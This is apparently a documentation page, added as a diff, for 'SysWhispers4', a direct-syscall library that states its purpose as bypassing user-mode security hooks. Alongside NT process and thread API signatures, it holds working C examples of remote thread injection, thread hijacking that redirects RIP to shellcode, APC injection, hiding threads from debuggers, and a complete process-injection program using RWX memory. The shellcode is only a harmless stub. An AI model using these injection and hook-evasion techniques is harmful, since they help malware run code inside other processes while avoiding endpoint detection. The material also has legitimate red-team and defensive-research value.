@@ -1,0 +1,839 @@
+---
+title: Process & Thread Functions
+description: NT syscall functions for process and thread creation, manipulation, and synchronization
+---
+
+## Overview
+
+SysWhispers4 provides comprehensive process and thread management via direct syscalls, bypassing user-mode hooks on functions like `CreateRemoteThread`, `OpenProcess`, etc.
+
+## Process Functions
+
+### NtOpenProcess
+
+Opens a handle to an existing process.
+
+```c
+NTSTATUS SW4_NtOpenProcess(
+    PHANDLE            ProcessHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID         ClientId
+);
+```
+
+#### Parameters
+
+<ParamField path="ProcessHandle" type="PHANDLE" required>
+  Pointer to a variable that receives the process handle.
+</ParamField>
+
+<ParamField path="DesiredAccess" type="ACCESS_MASK" required>
+  Access rights. Common values:
+  - `PROCESS_ALL_ACCESS` (0x1FFFFF)
+  - `PROCESS_VM_READ` (0x0010)
+  - `PROCESS_VM_WRITE` (0x0020)
+  - `PROCESS_VM_OPERATION` (0x0008)
+  - `PROCESS_CREATE_THREAD` (0x0002)
+</ParamField>
+
+<ParamField path="ObjectAttributes" type="POBJECT_ATTRIBUTES" required>
+  Pointer to `OBJECT_ATTRIBUTES` structure. Use `{sizeof(OBJECT_ATTRIBUTES)}` for default.
+</ParamField>
+
+<ParamField path="ClientId" type="PCLIENT_ID" required>
+  Pointer to `CLIENT_ID` structure identifying the process:
+  ```c
+  CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
+  ```
+</ParamField>
+
+#### Example
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+
+    DWORD targetPid = 1234;
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
+    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)targetPid, NULL };
+
+    NTSTATUS status = SW4_NtOpenProcess(
+        &hProcess,
+        PROCESS_ALL_ACCESS,
+        &oa,
+        &cid
+    );
+
+    if (NT_SUCCESS(status)) {
+        printf("[+] Opened process %lu -> handle 0x%p\n", targetPid, hProcess);
+        // Use the handle...
+        SW4_NtClose(hProcess);
+    } else {
+        fprintf(stderr, "[!] NtOpenProcess failed: 0x%08X\n", status);
+    }
+
+    return 0;
+}
+```
+
+---
+
+### NtCreateProcess
+
+Creates a new process (legacy function, rarely used).
+
+```c
+NTSTATUS SW4_NtCreateProcess(
+    PHANDLE            ProcessHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE             ParentProcess,
+    BOOLEAN            InheritObjectTable,
+    HANDLE             SectionHandle,
+    HANDLE             DebugPort,
+    HANDLE             TokenHandle
+);
+```
+
+---
+
+### NtCreateProcessEx
+
+Extended process creation (preferred over `NtCreateProcess`).
+
+```c
+NTSTATUS SW4_NtCreateProcessEx(
+    PHANDLE            ProcessHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE             ParentProcess,
+    ULONG              Flags,
+    HANDLE             SectionHandle,
+    HANDLE             DebugPort,
+    HANDLE             TokenHandle,
+    ULONG              Reserved
+);
+```
+
+---
+
+### NtCreateUserProcess
+
+Comprehensive process creation (Windows Vista+).
+
+```c
+NTSTATUS SW4_NtCreateUserProcess(
+    PHANDLE              ProcessHandle,
+    PHANDLE              ThreadHandle,
+    ACCESS_MASK          ProcessDesiredAccess,
+    ACCESS_MASK          ThreadDesiredAccess,
+    POBJECT_ATTRIBUTES   ProcessObjectAttributes,
+    POBJECT_ATTRIBUTES   ThreadObjectAttributes,
+    ULONG                ProcessFlags,
+    ULONG                ThreadFlags,
+    PVOID                ProcessParameters,
+    PPS_CREATE_INFO      CreateInfo,
+    PPS_ATTRIBUTE_LIST   AttributeList
+);
+```
+
+<Note>
+  `NtCreateUserProcess` is complex and requires extensive setup. For most use cases, use `CreateProcess` from Win32 or perform process hollowing via `NtCreateSection` + `NtMapViewOfSection`.
+</Note>
+
+---
+
+### NtTerminateProcess
+
+Terminates a process.
+
+```c
+NTSTATUS SW4_NtTerminateProcess(
+    HANDLE   ProcessHandle,
+    NTSTATUS ExitStatus
+);
+```
+
+#### Parameters
+
+<ParamField path="ProcessHandle" type="HANDLE">
+  Handle to process. Use `NULL` or `GetCurrentProcess()` to terminate current process.
+</ParamField>
+
+<ParamField path="ExitStatus" type="NTSTATUS" required>
+  Exit code for the process.
+</ParamField>
+
+#### Example
+
+```c
+// Terminate remote process
+HANDLE hProcess = ...;  // from NtOpenProcess
+SW4_NtTerminateProcess(hProcess, 0);
+SW4_NtClose(hProcess);
+```
+
+---
+
+### NtSuspendProcess
+
+Suspends all threads in a process (Windows Vista+).
+
+```c
+NTSTATUS SW4_NtSuspendProcess(
+    HANDLE ProcessHandle
+);
+```
+
+#### Example
+
+```c
+HANDLE hProcess = ...;
+SW4_NtSuspendProcess(hProcess);  // All threads frozen
+
+// Perform operations...
+
+SW4_NtResumeProcess(hProcess);   // Resume execution
+```
+
+---
+
+### NtResumeProcess
+
+Resumes all threads in a suspended process.
+
+```c
+NTSTATUS SW4_NtResumeProcess(
+    HANDLE ProcessHandle
+);
+```
+
+---
+
+### NtQueryInformationProcess
+
+Retrieves information about a process.
+
+```c
+NTSTATUS SW4_NtQueryInformationProcess(
+    HANDLE           ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID            ProcessInformation,
+    ULONG            ProcessInformationLength,
+    PULONG           ReturnLength
+);
+```
+
+#### Common Information Classes
+
+| Class | Value | Returns |
+|-------|-------|--------|
+| `ProcessBasicInformation` | 0 | `PROCESS_BASIC_INFORMATION` (PEB address, etc.) |
+| `ProcessDebugPort` | 7 | Debug port handle (0 = not debugged) |
+| `ProcessImageFileName` | 27 | Full path to executable |
+| `ProcessCommandLineInformation` | 60 | Command-line string |
+
+#### Example: Get PEB Address
+
+```c
+typedef struct _PROCESS_BASIC_INFORMATION {
+    NTSTATUS ExitStatus;
+    PVOID PebBaseAddress;
+    ULONG_PTR AffinityMask;
+    LONG BasePriority;
+    ULONG_PTR UniqueProcessId;
+    ULONG_PTR InheritedFromUniqueProcessId;
+} PROCESS_BASIC_INFORMATION;
+
+PROCESS_BASIC_INFORMATION pbi;
+NTSTATUS status = SW4_NtQueryInformationProcess(
+    GetCurrentProcess(),
+    ProcessBasicInformation,
+    &pbi,
+    sizeof(pbi),
+    NULL
+);
+
+if (NT_SUCCESS(status)) {
+    printf("[+] PEB at: %p\n", pbi.PebBaseAddress);
+}
+```
+
+---
+
+### NtSetInformationProcess
+
+Sets process information.
+
+```c
+NTSTATUS SW4_NtSetInformationProcess(
+    HANDLE           ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID            ProcessInformation,
+    ULONG            ProcessInformationLength
+);
+```
+
+#### Example: Set Critical Process
+
+```c
+// Make process critical (BSOD on termination - use with caution!)
+ULONG isCritical = 1;
+SW4_NtSetInformationProcess(
+    GetCurrentProcess(),
+    ProcessBreakOnTermination,  // 29
+    &isCritical,
+    sizeof(isCritical)
+);
+```
+
+---
+
+## Thread Functions
+
+### NtCreateThreadEx
+
+Creates a thread in a process.
+
+```c
+NTSTATUS SW4_NtCreateThreadEx(
+    PHANDLE            ThreadHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE             ProcessHandle,
+    PVOID              StartRoutine,
+    PVOID              Argument,
+    ULONG              CreateFlags,
+    SIZE_T             ZeroBits,
+    SIZE_T             StackSize,
+    SIZE_T             MaximumStackSize,
+    PPS_ATTRIBUTE_LIST AttributeList
+);
+```
+
+#### Parameters
+
+<ParamField path="ThreadHandle" type="PHANDLE" required>
+  Receives the thread handle.
+</ParamField>
+
+<ParamField path="DesiredAccess" type="ACCESS_MASK" required>
+  Access rights (use `THREAD_ALL_ACCESS` or `0x1FFFFF`).
+</ParamField>
+
+<ParamField path="ObjectAttributes" type="POBJECT_ATTRIBUTES">
+  Usually `NULL`.
+</ParamField>
+
+<ParamField path="ProcessHandle" type="HANDLE" required>
+  Target process handle (use `GetCurrentProcess()` for local thread).
+</ParamField>
+
+<ParamField path="StartRoutine" type="PVOID" required>
+  Thread entry point address.
+</ParamField>
+
+<ParamField path="Argument" type="PVOID">
+  Argument passed to thread function.
+</ParamField>
+
+<ParamField path="CreateFlags" type="ULONG" required>
+  Creation flags:
+  - `0` — Start immediately
+  - `0x00000001` — Create suspended
+  - `0x00000004` — Hide from debugger
+</ParamField>
+
+#### Example: Remote Thread Injection
+
+```c
+// After writing shellcode to remoteBase in target process:
+
+HANDLE hThread = NULL;
+NTSTATUS status = SW4_NtCreateThreadEx(
+    &hThread,
+    THREAD_ALL_ACCESS,
+    NULL,                  // ObjectAttributes
+    hProcess,              // Target process
+    remoteBase,            // Shellcode address
+    NULL,                  // No argument
+    0,                     // Start immediately
+    0, 0, 0,              // Stack defaults
+    NULL                   // No attribute list
+);
+
+if (NT_SUCCESS(status)) {
+    printf("[+] Remote thread created: 0x%p\n", hThread);
+    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+    SW4_NtClose(hThread);
+}
+```
+
+---
+
+### NtOpenThread
+
+Opens a handle to an existing thread.
+
+```c
+NTSTATUS SW4_NtOpenThread(
+    PHANDLE            ThreadHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID         ClientId
+);
+```
+
+#### Example
+
+```c
+DWORD targetTid = 5678;
+HANDLE hThread = NULL;
+OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+CLIENT_ID cid = { NULL, (HANDLE)(ULONG_PTR)targetTid };
+
+SW4_NtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &cid);
+```
+
+---
+
+### NtSuspendThread
+
+Suspends a thread.
+
+```c
+NTSTATUS SW4_NtSuspendThread(
+    HANDLE ThreadHandle,
+    PULONG PreviousSuspendCount
+);
+```
+
+#### Example
+
+```c
+HANDLE hThread = ...;
+ULONG prevCount;
+
+SW4_NtSuspendThread(hThread, &prevCount);
+printf("[*] Thread suspended (previous count: %lu)\n", prevCount);
+
+// Perform operations on suspended thread...
+
+SW4_NtResumeThread(hThread, NULL);
+```
+
+---
+
+### NtResumeThread
+
+Resumes a suspended thread.
+
+```c
+NTSTATUS SW4_NtResumeThread(
+    HANDLE ThreadHandle,
+    PULONG SuspendCount
+);
+```
+
+---
+
+### NtTerminateThread
+
+Terminates a thread.
+
+```c
+NTSTATUS SW4_NtTerminateThread(
+    HANDLE   ThreadHandle,
+    NTSTATUS ExitStatus
+);
+```
+
+---
+
+### NtGetContextThread
+
+Retrieves a thread's CPU context (registers).
+
+```c
+NTSTATUS SW4_NtGetContextThread(
+    HANDLE   ThreadHandle,
+    PCONTEXT ThreadContext
+);
+```
+
+#### Example
+
+```c
+CONTEXT ctx = { 0 };
+ctx.ContextFlags = CONTEXT_FULL;
+
+SW4_NtGetContextThread(hThread, &ctx);
+
+printf("[*] RIP: 0x%llx\n", ctx.Rip);
+printf("[*] RSP: 0x%llx\n", ctx.Rsp);
+```
+
+---
+
+### NtSetContextThread
+
+Sets a thread's CPU context.
+
+```c
+NTSTATUS SW4_NtSetContextThread(
+    HANDLE   ThreadHandle,
+    PCONTEXT ThreadContext
+);
+```
+
+#### Example: Thread Hijacking
+
+```c
+// Suspend target thread
+SW4_NtSuspendThread(hThread, NULL);
+
+// Get current context
+CONTEXT ctx = { 0 };
+ctx.ContextFlags = CONTEXT_FULL;
+SW4_NtGetContextThread(hThread, &ctx);
+
+// Hijack RIP to point to shellcode
+ctx.Rip = (DWORD64)shellcodeAddress;
+
+// Set modified context
+SW4_NtSetContextThread(hThread, &ctx);
+
+// Resume — thread now executes shellcode
+SW4_NtResumeThread(hThread, NULL);
+```
+
+---
+
+### NtQueueApcThread
+
+Queues an APC (Asynchronous Procedure Call) to a thread.
+
+```c
+NTSTATUS SW4_NtQueueApcThread(
+    HANDLE           ThreadHandle,
+    PPS_APC_ROUTINE  ApcRoutine,
+    PVOID            ApcArgument1,
+    PVOID            ApcArgument2,
+    PVOID            ApcArgument3
+);
+```
+
+#### Example: APC Injection
+
+```c
+// Thread must be in alertable wait state (e.g., SleepEx, WaitForSingleObjectEx)
+
+HANDLE hThread = ...;  // Target thread
+PVOID shellcodeAddr = ...;
+
+SW4_NtQueueApcThread(
+    hThread,
+    (PPS_APC_ROUTINE)shellcodeAddr,
+    NULL, NULL, NULL
+);
+
+printf("[+] APC queued — will execute when thread enters alertable state\n");
+```
+
+---
+
+### NtQueueApcThreadEx
+
+Extended APC queuing (Windows 7+).
+
+```c
+NTSTATUS SW4_NtQueueApcThreadEx(
+    HANDLE           ThreadHandle,
+    HANDLE           ReserveHandle,
+    PPS_APC_ROUTINE  ApcRoutine,
+    PVOID            ApcArgument1,
+    PVOID            ApcArgument2,
+    PVOID            ApcArgument3
+);
+```
+
+---
+
+### NtTestAlert
+
+Tests if APCs are pending for the current thread and executes them.
+
+```c
+NTSTATUS SW4_NtTestAlert(VOID);
+```
+
+---
+
+### NtAlertThread
+
+Alerts a thread (forces APC delivery).
+
+```c
+NTSTATUS SW4_NtAlertThread(
+    HANDLE ThreadHandle
+);
+```
+
+---
+
+### NtAlertResumeThread
+
+Alerts and resumes a thread in one operation.
+
+```c
+NTSTATUS SW4_NtAlertResumeThread(
+    HANDLE ThreadHandle,
+    PULONG PreviousSuspendCount
+);
+```
+
+---
+
+### NtQueryInformationThread
+
+Retrieves thread information.
+
+```c
+NTSTATUS SW4_NtQueryInformationThread(
+    HANDLE           ThreadHandle,
+    THREADINFOCLASS  ThreadInformationClass,
+    PVOID            ThreadInformation,
+    ULONG            ThreadInformationLength,
+    PULONG           ReturnLength
+);
+```
+
+#### Example: Check if Thread is in Alertable State
+
+```c
+ULONG alertable;
+SW4_NtQueryInformationThread(
+    hThread,
+    ThreadIsIoPending,  // Or other classes
+    &alertable,
+    sizeof(alertable),
+    NULL
+);
+```
+
+---
+
+### NtSetInformationThread
+
+Sets thread information.
+
+```c
+NTSTATUS SW4_NtSetInformationThread(
+    HANDLE           ThreadHandle,
+    THREADINFOCLASS  ThreadInformationClass,
+    PVOID            ThreadInformation,
+    ULONG            ThreadInformationLength
+);
+```
+
+#### Example: Hide Thread from Debugger
+
+```c
+ULONG hideFromDebugger = 1;
+SW4_NtSetInformationThread(
+    GetCurrentThread(),
+    ThreadHideFromDebugger,  // 17
+    NULL,  // No buffer needed for this class
+    0
+);
+```
+
+---
+
+## Synchronization Functions
+
+### NtWaitForSingleObject
+
+Waits for an object to be signaled.
+
+```c
+NTSTATUS SW4_NtWaitForSingleObject(
+    HANDLE         Handle,
+    BOOLEAN        Alertable,
+    PLARGE_INTEGER Timeout
+);
+```
+
+#### Parameters
+
+<ParamField path="Handle" type="HANDLE" required>
+  Handle to wait on (thread, process, event, etc.).
+</ParamField>
+
+<ParamField path="Alertable" type="BOOLEAN" required>
+  If `TRUE`, function returns when an APC is queued.
+</ParamField>
+
+<ParamField path="Timeout" type="PLARGE_INTEGER">
+  Timeout in 100-nanosecond intervals. Use `NULL` for infinite wait.
+</ParamField>
+
+#### Example
+
+```c
+// Wait for thread to complete
+SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+printf("[+] Thread completed\n");
+```
+
+---
+
+### NtWaitForMultipleObjects
+
+Waits for multiple objects.
+
+```c
+NTSTATUS SW4_NtWaitForMultipleObjects(
+    ULONG          Count,
+    PHANDLE        Handles,
+    WAIT_TYPE      WaitType,
+    BOOLEAN        Alertable,
+    PLARGE_INTEGER Timeout
+);
+```
+
+#### Parameters
+
+<ParamField path="WaitType" type="WAIT_TYPE" required>
+  - `WaitAll` (0) — Wait for all objects
+  - `WaitAny` (1) — Wait for any object
+</ParamField>
+
+---
+
+### NtSignalAndWaitForSingleObject
+
+Signals one object and waits for another in one atomic operation.
+
+```c
+NTSTATUS SW4_NtSignalAndWaitForSingleObject(
+    HANDLE         SignalHandle,
+    HANDLE         WaitHandle,
+    BOOLEAN        Alertable,
+    PLARGE_INTEGER Timeout
+);
+```
+
+---
+
+### NtClose
+
+Closes a handle.
+
+```c
+NTSTATUS SW4_NtClose(
+    HANDLE Handle
+);
+```
+
+<Warning>
+  Always close handles when done to avoid handle leaks.
+</Warning>
+
+#### Example
+
+```c
+HANDLE hProcess = ...;
+// Use the handle...
+SW4_NtClose(hProcess);
+```
+
+---
+
+### NtDuplicateObject
+
+Duplicates a handle.
+
+```c
+NTSTATUS SW4_NtDuplicateObject(
+    HANDLE      SourceProcessHandle,
+    HANDLE      SourceHandle,
+    HANDLE      TargetProcessHandle,
+    PHANDLE     TargetHandle,
+    ACCESS_MASK DesiredAccess,
+    ULONG       HandleAttributes,
+    ULONG       Options
+);
+```
+
+---
+
+## Complete Example: Process Injection
+
+Combining process and thread functions:
+
+```c
+#include <stdio.h>
+#include "SW4Syscalls.h"
+
+static const unsigned char shellcode[] = {
+    0x90, 0x90, 0x90, 0xC3  // nop; nop; nop; ret
+};
+
+int main(void) {
+    if (!SW4_Initialize()) return 1;
+
+    DWORD targetPid = 1234;
+
+    // 1. Open process
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
+    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)targetPid, NULL };
+    NTSTATUS status = SW4_NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+    if (!NT_SUCCESS(status)) return 1;
+
+    // 2. Allocate memory
+    PVOID base = NULL;
+    SIZE_T size = sizeof(shellcode);
+    SW4_NtAllocateVirtualMemory(hProcess, &base, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // 3. Write shellcode
+    SW4_NtWriteVirtualMemory(hProcess, base, (PVOID)shellcode,
+        sizeof(shellcode), NULL);
+
+    // 4. Change to RX
+    ULONG oldProt;
+    SW4_NtProtectVirtualMemory(hProcess, &base, &size,
+        PAGE_EXECUTE_READ, &oldProt);
+
+    // 5. Create thread
+    HANDLE hThread = NULL;
+    status = SW4_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
+        hProcess, base, NULL, 0, 0, 0, 0, NULL);
+
+    if (NT_SUCCESS(status)) {
+        printf("[+] Remote thread created\n");
+        SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+        SW4_NtClose(hThread);
+    }
+
+    SW4_NtClose(hProcess);
+    return 0;
+}
+```
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="File Functions" icon="file" href="/api/file-functions">
+    NT file I/O operations
+  </Card>
+  <Card title="Token Functions" icon="key" href="/api/token-functions">
+    Token manipulation and privilege escalation
+  </Card>
+</CardGroup>
